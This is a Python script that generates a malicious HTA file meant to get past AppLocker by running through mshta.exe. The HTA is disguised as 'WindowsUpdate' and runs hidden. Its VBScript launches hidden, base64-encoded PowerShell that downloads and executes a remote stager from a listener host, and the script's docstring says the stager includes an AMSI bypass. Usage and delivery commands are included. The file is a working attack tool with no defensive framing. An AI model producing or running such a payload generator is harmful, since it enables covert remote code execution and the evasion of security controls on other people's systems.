#!/usr/bin/env python3
"""
gen_hta.py — HTA (mshta.exe) AppLocker bypass payload generator

mshta.exe is in WINDIR/System32/ -- allowed by every AppLocker default
rule set. HTA files execute VBScript natively, no PowerShell restrictions.
The generated HTA IEX-downloads the stager (AMSI bypass + runner + enc).

Usage:
  python3 gen_hta.py -l 10.0.0.1 -p 8888 -o payload.hta
  python3 gen_hta.py --stager-url http://10.0.0.1:8888/stager.ps1 -o payload.hta

Deliver:
  mshta http://LHOST:PORT/payload.hta        # remote pull (no file written)
  mshta C:\\path\\payload.hta                 # local file
"""

import argparse
import base64
import os


def generate(stager_url: str, output_path: str = "payload.hta") -> bool:
    ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('{stager_url}')"
    ps_enc = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()

    hta = f"""<html><head><hta:application
  applicationname="WindowsUpdate"
  windowstate="minimize"
  showintaskbar="no"
  sysmenu="no"
  caption="no"
  border="none"
/>
<script language="VBScript">
Sub Window_OnLoad()
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "powershell.exe -NoP -NonI -W Hidden -Enc {ps_enc}", 0, False
    Set oShell = Nothing
    Self.close
End Sub
</script>
</head><body></body></html>
"""

    with open(output_path, "w") as f:
        f.write(hta)

    size = os.path.getsize(output_path)
    fname = os.path.basename(output_path)
    print(f"[+] HTA: {output_path} ({size} bytes)")
    print(f"[*] Remote:  mshta http://LHOST:PORT/{fname}")
    print(f"[*] Local:   mshta {output_path}")
    return True


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="HTA (mshta.exe) AppLocker bypass generator")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--stager-url", help="Full URL to stager.ps1")
    g.add_argument("-l", "--lhost", help="Listener host (builds stager URL automatically)")
    p.add_argument("-p", "--port", type=int, default=8888, help="HTTP port (default 8888)")
    p.add_argument("--stager-name", default="stager.ps1", help="Stager filename on server")
    p.add_argument("-o", "--output", default="payload.hta", help="Output HTA path")
    args = p.parse_args()

    url = args.stager_url or f"http://{args.lhost}:{args.port}/{args.stager_name}"
    generate(url, args.output)
